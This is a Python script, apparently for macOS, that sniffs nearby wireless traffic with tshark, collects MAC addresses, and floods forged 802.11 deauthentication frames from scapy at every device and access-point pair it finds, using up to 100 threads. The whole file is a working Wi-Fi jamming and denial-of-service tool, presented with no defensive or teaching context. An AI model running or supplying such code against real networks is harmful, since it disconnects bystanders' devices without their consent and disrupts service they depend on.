from scapy.all import *
import concurrent.futures
import time
import subprocess
import re

def deauth(target_mac, access_point_mac):
    interface = "en0"
    packet_count = 100
    interval = 0.1
    conf.iface = interface
    pkt = (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac) /
        Dot11Deauth()
    )
    sendp(pkt, inter=interval, count=packet_count, verbose=0)

def maccy():
    # Disconnect from the current network
    disconnect_cmd = "networksetup -setairportpower en0 off"
    subprocess.run(disconnect_cmd, shell=True)
    disconnect_cmd = "networksetup -setairportpower en0 on"
    subprocess.run(disconnect_cmd, shell=True)

    # Run tshark in intercept mode on en0 for 15 seconds
    tshark_cmd = "tshark -i en0 -I -a duration:15 -T fields -e eth.src -e eth.dst"
    tshark_process = subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    # Regular expression pattern for MAC addresses
    mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"

    # Read tshark output and extract MAC addresses
    mac_addresses = []
    for line in iter(tshark_process.stdout.readline, b''):
        line = line.decode('utf-8')
        mac_matches = re.findall(mac_regex, line)
        if mac_matches:
            mac_addresses.extend(mac_matches)

    # Re-enable the network connection
    disable_cmd = ["networksetup", "-setnetworkserviceenabled", "en0", "off"]
    enable_cmd = ["networksetup", "-setnetworkserviceenabled", "en0", "on"]
    subprocess.run(disable_cmd, check=True)
    subprocess.run(enable_cmd, check=True)

    for mac in mac_addresses:
        yield mac

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    for wifi in maccy():
        for device in maccy():
            try:
                executor.submit(deauth, device, wifi)
            except Exception as e:
                time.sleep(60)
                executor.submit(deauth, device, wifi)
